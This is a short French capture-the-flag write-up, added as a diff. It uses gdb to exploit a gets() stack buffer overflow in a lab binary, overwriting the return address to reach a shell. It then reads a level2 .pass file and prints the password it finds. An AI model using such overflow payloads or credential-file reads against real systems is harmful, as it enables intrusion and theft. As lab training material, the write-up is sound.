@@ -1,0 +1,24 @@
+
+On peut voir que le programme utilise gets(), qui va nous permettre de faire un buffer overflow, debut de son adresse:
+	0x08048489 <+9>:     lea    0x10(%esp),%eax
+
+	(gdb) b * 0x08048495
+	(gdb) run
+	AAAA
+	(gdb) x/4xb $eax
+	0xbffff6f0:     0x41    0x41    0x41    0x41
+	(gdb) x/8xb $ebp
+	0xbffff738:     0x00    0x00    0x00    0x00    0xd3    0x54    0xe4    0xb7
+
+On doit donc overflow de (0xbffff738 - 0xbffff6f0 + 8 = 72 + 8) pour override la return address par celle de <run>:
+	(gdb) disas run
+	Dump of assembler code for function run:
+		0x08048444 <+0>:     push   %ebp
+		[...]
+	
+	$ chmod 777 ./ && echo `python -c 'print "A"*72 + "BBBB" + "\x44\x84\x04\x08"'` > exploit
+	$ cat exploit - | ./level1
+# on atteri dans un nouveau shell	
+	Good... Wait what?
+	cat /home/user/level2/.pass
+	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
